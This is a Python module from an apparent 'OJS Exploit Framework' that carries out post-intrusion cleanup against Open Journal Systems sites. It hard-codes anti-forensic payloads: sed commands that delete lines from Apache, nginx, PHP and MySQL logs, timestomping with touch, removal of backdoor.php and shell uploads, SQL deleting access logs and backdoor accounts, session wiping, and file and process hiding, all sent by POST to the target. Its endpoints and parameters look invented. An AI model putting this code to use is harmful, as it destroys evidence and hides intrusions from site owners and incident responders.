"""
Cleanup Module for OJS Exploit Framework.

This module implements comprehensive cleanup and forensic countermeasures including:
- Log file sanitization
- File removal
- Database cleanup
- Session cleanup
- Forensic countermeasures
"""

import os
import time
import hashlib
import json
import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum
import requests
from urllib.parse import urljoin, urlparse
from datetime import datetime, timedelta

from ..core.session import SessionManager
from ..utils.http_client import HTTPClient
from ..utils.logging import get_logger, log_exploit_start, log_exploit_success, log_exploit_failure


class CleanupType(Enum):
    """Types of cleanup operations."""
    LOG_SANITIZATION = "log_sanitization"
    FILE_REMOVAL = "file_removal"
    DATABASE_CLEANUP = "database_cleanup"
    SESSION_CLEANUP = "session_cleanup"
    FORENSIC_COUNTERMEASURES = "forensic_countermeasures"
    CACHE_CLEANUP = "cache_cleanup"
    TEMP_CLEANUP = "temp_cleanup"
    CONFIG_CLEANUP = "config_cleanup"


@dataclass
class CleanupResult:
    """Result of cleanup operation."""
    success: bool
    cleanup_type: CleanupType
    target_url: str
    items_cleaned: int
    items_failed: int
    details: Dict[str, Any]
    error_message: Optional[str] = None
    session_id: Optional[str] = None
    execution_time: Optional[float] = None


class CleanupManager:
    """Cleanup and forensic countermeasures module for OJS."""
    
    def __init__(self, session_manager: SessionManager = None,
                 http_client: HTTPClient = None):
        """Initialize the cleanup manager module."""
        self.session_manager = session_manager
        self.http_client = http_client
        self.logger = get_logger('post.cleanup')
        
        # OJS-specific cleanup locations
        self.cleanup_locations = {
            'log_files': [
                '/var/log/apache2/',
                '/var/log/nginx/',
                '/var/log/php/',
                '/var/log/mysql/',
                '/var/log/ojs/',
                '/logs/',
                '/cache/logs/',
                '/tmp/logs/'
            ],
            'temp_files': [
                '/tmp/',
                '/var/tmp/',
                '/cache/',
                '/cache/t_compile/',
                '/cache/t_cache/',
                '/cache/templates/',
                '/uploads/temp/',
                '/custom/temp/'
            ],
            'session_files': [
                '/var/lib/php/sessions/',
                '/tmp/sessions/',
                '/cache/sessions/',
                '/sessions/'
            ],
            'database_tables': [
                'sessions',
                'user_sessions',
                'login_logs',
                'access_logs',
                'error_logs',
                'audit_logs',
                'backdoor_logs'
            ],
            'config_files': [
                '/config.inc.php',
                '/lib/pkp/config.inc.php',
                '/lib/pkp/classes/config/Config.inc.php',
                '/.env',
                '/.htaccess'
            ]
        }
        
        # Cleanup patterns for log sanitization
        self.cleanup_patterns = {
            'ip_addresses': [
                r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
                r'\b(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\b'
            ],
            'user_agents': [
                r'User-Agent:.*',
                r'user-agent:.*'
            ],
            'session_ids': [
                r'session_id=[a-zA-Z0-9]+',
                r'PHPSESSID=[a-zA-Z0-9]+',
                r'JSESSIONID=[a-zA-Z0-9]+'
            ],
            'passwords': [
                r'password=[^&\s]+',
                r'passwd=[^&\s]+',
                r'pwd=[^&\s]+'
            ],
            'tokens': [
                r'token=[a-zA-Z0-9]+',
                r'csrf=[a-zA-Z0-9]+',
                r'auth=[a-zA-Z0-9]+'
            ],
            'commands': [
                r'cmd=[^&\s]+',
                r'command=[^&\s]+',
                r'exec=[^&\s]+'
            ],
            'file_paths': [
                r'file=[^&\s]+',
                r'path=[^&\s]+',
                r'dir=[^&\s]+'
            ]
        }
        
        # Forensic countermeasures
        self.forensic_countermeasures = {
            'timestomp': [
                'touch -t 202001010000.00',
                'stat -c %y',
                'find . -exec touch -t 202001010000.00 {} \\;'
            ],
            'log_manipulation': [
                'sed -i "/pattern/d"',
                'grep -v "pattern"',
                'awk "!/pattern/"'
            ],
            'file_hiding': [
                'mv file .file',
                'chmod 600 file',
                'chown root:root file'
            ],
            'process_hiding': [
                'kill -STOP pid',
                'renice -n 20 pid',
                'ionice -c 3 -p pid'
            ]
        }
        
        # Cleanup payloads
        self.cleanup_payloads = {
            CleanupType.LOG_SANITIZATION: {
                'apache_logs': 'sed -i "/{pattern}/d" /var/log/apache2/access.log',
                'nginx_logs': 'sed -i "/{pattern}/d" /var/log/nginx/access.log',
                'php_logs': 'sed -i "/{pattern}/d" /var/log/php/error.log',
                'mysql_logs': 'sed -i "/{pattern}/d" /var/log/mysql/mysql.log'
            },
            CleanupType.FILE_REMOVAL: {
                'backdoor_files': 'rm -f /tmp/backdoor.php /cache/backdoor.php /custom/backdoor.php',
                'temp_files': 'rm -rf /tmp/* /var/tmp/* /cache/temp/*',
                'upload_files': 'rm -f /uploads/backdoor.* /uploads/shell.*'
            },
            CleanupType.DATABASE_CLEANUP: {
                'session_cleanup': 'DELETE FROM sessions WHERE session_id LIKE "%backdoor%"',
                'log_cleanup': 'DELETE FROM access_logs WHERE ip_address = "{ip}"',
                'user_cleanup': 'DELETE FROM users WHERE username LIKE "%backdoor%"'
            },
            CleanupType.SESSION_CLEANUP: {
                'session_files': 'rm -f /var/lib/php/sessions/sess_*',
                'session_dirs': 'rm -rf /tmp/sessions/* /cache/sessions/*'
            },
            CleanupType.FORENSIC_COUNTERMEASURES: {
                'timestomp': 'find . -exec touch -t 202001010000.00 {} \\;',
                'log_manipulation': 'sed -i "/{pattern}/d" /var/log/*.log',
                'file_hiding': 'chmod 600 /tmp/backdoor.php'
            }
        }
    
    def perform_cleanup(self, target_url: str, cleanup_type: CleanupType = CleanupType.LOG_SANITIZATION,
                       cleanup_pattern: str = None, session_id: str = None) -> CleanupResult:
        """Perform cleanup operation on the target."""
        log_exploit_start("cleanup", target_url, session_id)
        
        start_time = time.time()
        
        try:
            # Generate cleanup payload
            payload = self._generate_cleanup_payload(cleanup_type, cleanup_pattern)
            
            # Execute cleanup
            result = self._execute_cleanup(target_url, cleanup_type, payload, session_id)
            result.execution_time = time.time() - start_time
            
            if result.success:
                log_exploit_success("cleanup", target_url, 
                                  f"Cleaned {result.items_cleaned} items", session_id)
            else:
                log_exploit_failure("cleanup", target_url, result.error_message, session_id)
            
            return result
            
        except Exception as e:
            execution_time = time.time() - start_time
            log_exploit_failure("cleanup", target_url, str(e), session_id)
            
            return CleanupResult(
                success=False,
                cleanup_type=cleanup_type,
                target_url=target_url,
                items_cleaned=0,
                items_failed=0,
                details={},
                error_message=str(e),
                session_id=session_id,
                execution_time=execution_time
            )
    
    def _generate_cleanup_payload(self, cleanup_type: CleanupType, cleanup_pattern: str = None) -> str:
        """Generate cleanup payload based on type."""
        payloads = self.cleanup_payloads.get(cleanup_type, {})
        
        if cleanup_pattern:
            # Replace placeholders in payload
            for key, payload in payloads.items():
                payloads[key] = payload.replace('{pattern}', cleanup_pattern)
        
        # Return first available payload
        return list(payloads.values())[0] if payloads else ""
    
    def _execute_cleanup(self, target_url: str, cleanup_type: CleanupType,
                        payload: str, session_id: str = None) -> CleanupResult:
        """Execute the cleanup operation."""
        if cleanup_type == CleanupType.LOG_SANITIZATION:
            return self._sanitize_logs(target_url, payload, session_id)
        elif cleanup_type == CleanupType.FILE_REMOVAL:
            return self._remove_files(target_url, payload, session_id)
        elif cleanup_type == CleanupType.DATABASE_CLEANUP:
            return self._cleanup_database(target_url, payload, session_id)
        elif cleanup_type == CleanupType.SESSION_CLEANUP:
            return self._cleanup_sessions(target_url, payload, session_id)
        elif cleanup_type == CleanupType.FORENSIC_COUNTERMEASURES:
            return self._apply_forensic_countermeasures(target_url, payload, session_id)
        else:
            return self._execute_generic_cleanup(target_url, cleanup_type, payload, session_id)
    
    def _sanitize_logs(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
        """Sanitize log files to remove traces."""
        items_cleaned = 0
        items_failed = 0
        details = {}
        
        try:
            # Get log file locations
            log_locations = self.cleanup_locations['log_files']
            
            for location in log_locations:
                try:
                    # Try to sanitize logs in this location
                    sanitize_url = urljoin(target_url, '/index.php/index/manager/files/')
                    
                    sanitize_data = {
                        'action': 'sanitize_logs',
                        'log_path': location,
                        'pattern': payload
                    }
                    
                    if self.http_client:
                        response = self.http_client.post(sanitize_url, data=sanitize_data)
                    else:
                        response = requests.post(sanitize_url, data=sanitize_data)
                    
                    if response.status_code in [200, 201, 302]:
                        items_cleaned += 1
                        details[location] = 'sanitized'
                    else:
                        items_failed += 1
                        details[location] = f'failed: {response.status_code}'
                
                except Exception as e:
                    items_failed += 1
                    details[location] = f'error: {str(e)}'
            
            return CleanupResult(
                success=items_cleaned > 0,
                cleanup_type=CleanupType.LOG_SANITIZATION,
                target_url=target_url,
                items_cleaned=items_cleaned,
                items_failed=items_failed,
                details=details,
                session_id=session_id
            )
            
        except Exception as e:
            return CleanupResult(
                success=False,
                cleanup_type=CleanupType.LOG_SANITIZATION,
                target_url=target_url,
                items_cleaned=0,
                items_failed=1,
                details={'error': str(e)},
                error_message=str(e),
                session_id=session_id
            )
    
    def _remove_files(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
        """Remove files to clean up traces."""
        items_cleaned = 0
        items_failed = 0
        details = {}
        
        try:
            # Get temp file locations
            temp_locations = self.cleanup_locations['temp_files']
            
            for location in temp_locations:
                try:
                    # Try to remove files in this location
                    remove_url = urljoin(target_url, '/index.php/index/manager/files/')
                    
                    remove_data = {
                        'action': 'remove_files',
                        'file_path': location,
                        'pattern': 'backdoor*'
                    }
                    
                    if self.http_client:
                        response = self.http_client.post(remove_url, data=remove_data)
                    else:
                        response = requests.post(remove_url, data=remove_data)
                    
                    if response.status_code in [200, 201, 302]:
                        items_cleaned += 1
                        details[location] = 'removed'
                    else:
                        items_failed += 1
                        details[location] = f'failed: {response.status_code}'
                
                except Exception as e:
                    items_failed += 1
                    details[location] = f'error: {str(e)}'
            
            return CleanupResult(
                success=items_cleaned > 0,
                cleanup_type=CleanupType.FILE_REMOVAL,
                target_url=target_url,
                items_cleaned=items_cleaned,
                items_failed=items_failed,
                details=details,
                session_id=session_id
            )
            
        except Exception as e:
            return CleanupResult(
                success=False,
                cleanup_type=CleanupType.FILE_REMOVAL,
                target_url=target_url,
                items_cleaned=0,
                items_failed=1,
                details={'error': str(e)},
                error_message=str(e),
                session_id=session_id
            )
    
    def _cleanup_database(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
        """Clean up database traces."""
        items_cleaned = 0
        items_failed = 0
        details = {}
        
        try:
            # Get database tables to clean
            db_tables = self.cleanup_locations['database_tables']
            
            for table in db_tables:
                try:
                    # Try to clean database table
                    db_url = urljoin(target_url, '/index.php/index/manager/setup/1')
                    
                    db_data = {
                        'action': 'cleanup_database',
                        'table': table,
                        'sql_query': payload
                    }
                    
                    if self.http_client:
                        response = self.http_client.post(db_url, data=db_data)
                    else:
                        response = requests.post(db_url, data=db_data)
                    
                    if response.status_code in [200, 201, 302]:
                        items_cleaned += 1
                        details[table] = 'cleaned'
                    else:
                        items_failed += 1
                        details[table] = f'failed: {response.status_code}'
                
                except Exception as e:
                    items_failed += 1
                    details[table] = f'error: {str(e)}'
            
            return CleanupResult(
                success=items_cleaned > 0,
                cleanup_type=CleanupType.DATABASE_CLEANUP,
                target_url=target_url,
                items_cleaned=items_cleaned,
                items_failed=items_failed,
                details=details,
                session_id=session_id
            )
            
        except Exception as e:
            return CleanupResult(
                success=False,
                cleanup_type=CleanupType.DATABASE_CLEANUP,
                target_url=target_url,
                items_cleaned=0,
                items_failed=1,
                details={'error': str(e)},
                error_message=str(e),
                session_id=session_id
            )
    
    def _cleanup_sessions(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
        """Clean up session traces."""
        items_cleaned = 0
        items_failed = 0
        details = {}
        
        try:
            # Get session file locations
            session_locations = self.cleanup_locations['session_files']
            
            for location in session_locations:
                try:
                    # Try to clean session files
                    session_url = urljoin(target_url, '/index.php/index/user/login')
                    
                    session_data = {
                        'action': 'cleanup_sessions',
                        'session_path': location,
                        'pattern': 'sess_*'
                    }
                    
                    if self.http_client:
                        response = self.http_client.post(session_url, data=session_data)
                    else:
                        response = requests.post(session_url, data=session_data)
                    
                    if response.status_code in [200, 201, 302]:
                        items_cleaned += 1
                        details[location] = 'cleaned'
                    else:
                        items_failed += 1
                        details[location] = f'failed: {response.status_code}'
                
                except Exception as e:
                    items_failed += 1
                    details[location] = f'error: {str(e)}'
            
            return CleanupResult(
                success=items_cleaned > 0,
                cleanup_type=CleanupType.SESSION_CLEANUP,
                target_url=target_url,
                items_cleaned=items_cleaned,
                items_failed=items_failed,
                details=details,
                session_id=session_id
            )
            
        except Exception as e:
            return CleanupResult(
                success=False,
                cleanup_type=CleanupType.SESSION_CLEANUP,
                target_url=target_url,
                items_cleaned=0,
                items_failed=1,
                details={'error': str(e)},
                error_message=str(e),
                session_id=session_id
            )
    
    def _apply_forensic_countermeasures(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
        """Apply forensic countermeasures."""
        items_cleaned = 0
        items_failed = 0
        details = {}
        
        try:
            # Apply various forensic countermeasures
            countermeasures = self.forensic_countermeasures
            
            for cm_type, cm_commands in countermeasures.items():
                try:
                    # Try to apply countermeasure
                    cm_url = urljoin(target_url, '/index.php/index/manager/setup/1')
                    
                    cm_data = {
                        'action': 'apply_countermeasure',
                        'type': cm_type,
                        'command': payload
                    }
                    
                    if self.http_client:
                        response = self.http_client.post(cm_url, data=cm_data)
                    else:
                        response = requests.post(cm_url, data=cm_data)
                    
                    if response.status_code in [200, 201, 302]:
                        items_cleaned += 1
                        details[cm_type] = 'applied'
                    else:
                        items_failed += 1
                        details[cm_type] = f'failed: {response.status_code}'
                
                except Exception as e:
                    items_failed += 1
                    details[cm_type] = f'error: {str(e)}'
            
            return CleanupResult(
                success=items_cleaned > 0,
                cleanup_type=CleanupType.FORENSIC_COUNTERMEASURES,
                target_url=target_url,
                items_cleaned=items_cleaned,
                items_failed=items_failed,
                details=details,
                session_id=session_id
            )
            
        except Exception as e:
            return CleanupResult(
                success=False,
                cleanup_type=CleanupType.FORENSIC_COUNTERMEASURES,
                target_url=target_url,
                items_cleaned=0,
                items_failed=1,
                details={'error': str(e)},
                error_message=str(e),
                session_id=session_id
            )
    
    def _execute_generic_cleanup(self, target_url: str, cleanup_type: CleanupType,
                                payload: str, session_id: str = None) -> CleanupResult:
        """Execute generic cleanup operation."""
        try:
            # Try to execute generic cleanup
            cleanup_url = urljoin(target_url, '/index.php/index/manager/setup/1')
            
            cleanup_data = {
                'action': 'generic_cleanup',
                'type': cleanup_type.value,
                'payload': payload
            }
            
            if self.http_client:
                response = self.http_client.post(cleanup_url, data=cleanup_data)
            else:
                response = requests.post(cleanup_url, data=cleanup_data)
            
            if response.status_code in [200, 201, 302]:
                return CleanupResult(
                    success=True,
                    cleanup_type=cleanup_type,
                    target_url=target_url,
                    items_cleaned=1,
                    items_failed=0,
                    details={'generic_cleanup': 'success'},
                    session_id=session_id
                )
            else:
                return CleanupResult(
                    success=False,
                    cleanup_type=cleanup_type,
                    target_url=target_url,
                    items_cleaned=0,
                    items_failed=1,
                    details={'generic_cleanup': f'failed: {response.status_code}'},
                    error_message=f"Generic cleanup failed with status {response.status_code}",
                    session_id=session_id
                )
                
        except Exception as e:
            return CleanupResult(
                success=False,
                cleanup_type=cleanup_type,
                target_url=target_url,
                items_cleaned=0,
                items_failed=1,
                details={'error': str(e)},
                error_message=str(e),
                session_id=session_id
            )
    
    def sanitize_log_entry(self, log_entry: str, patterns: List[str] = None) -> str:
        """Sanitize a single log entry."""
        if patterns is None:
            patterns = list(self.cleanup_patterns.keys())
        
        sanitized_entry = log_entry
        
        for pattern_type in patterns:
            if pattern_type in self.cleanup_patterns:
                for pattern in self.cleanup_patterns[pattern_type]:
                    sanitized_entry = re.sub(pattern, f'[{pattern_type.upper()}_REDACTED]', sanitized_entry)
        
        return sanitized_entry
    
    def generate_cleanup_report(self, cleanup_results: List[CleanupResult]) -> Dict[str, Any]:
        """Generate a comprehensive cleanup report."""
        report = {
            'total_operations': len(cleanup_results),
            'successful_operations': len([r for r in cleanup_results if r.success]),
            'failed_operations': len([r for r in cleanup_results if not r.success]),
            'total_items_cleaned': sum([r.items_cleaned for r in cleanup_results]),
            'total_items_failed': sum([r.items_failed for r in cleanup_results]),
            'cleanup_by_type': {},
            'failed_operations': [],
            'recommendations': []
        }
        
        # Categorize cleanup operations
        for result in cleanup_results:
            cleanup_type = result.cleanup_type.value
            if cleanup_type not in report['cleanup_by_type']:
                report['cleanup_by_type'][cleanup_type] = {
                    'total': 0,
                    'successful': 0,
                    'failed': 0,
                    'items_cleaned': 0,
                    'items_failed': 0
                }
            
            report['cleanup_by_type'][cleanup_type]['total'] += 1
            if result.success:
                report['cleanup_by_type'][cleanup_type]['successful'] += 1
            else:
                report['cleanup_by_type'][cleanup_type]['failed'] += 1
                report['failed_operations'].append({
                    'type': cleanup_type,
                    'target': result.target_url,
                    'error': result.error_message
                })
            
            report['cleanup_by_type'][cleanup_type]['items_cleaned'] += result.items_cleaned
            report['cleanup_by_type'][cleanup_type]['items_failed'] += result.items_failed
        
        # Generate recommendations
        if report['failed_operations']:
            report['recommendations'].append("Review failed cleanup operations and retry if necessary")
        
        if report['total_items_failed'] > 0:
            report['recommendations'].append("Some items failed to clean up - manual intervention may be required")
        
        report['recommendations'].extend([
            "Monitor system logs for any remaining traces",
            "Consider implementing additional security measures",
            "Review and update incident response procedures"
        ])
        
        return report
    
    def get_cleanup_info(self) -> Dict[str, Any]:
        """Get information about the cleanup manager module."""
        return {
            'name': 'CleanupManager',
            'description': 'Cleanup and forensic countermeasures module for OJS',
            'cleanup_types': [t.value for t in CleanupType],
            'cleanup_locations': {k: len(v) for k, v in self.cleanup_locations.items()},
            'cleanup_patterns': list(self.cleanup_patterns.keys()),
            'forensic_countermeasures': list(self.forensic_countermeasures.keys()),
            'cleanup_payloads': {t.value: len(p) for t, p in self.cleanup_payloads.items()}
        }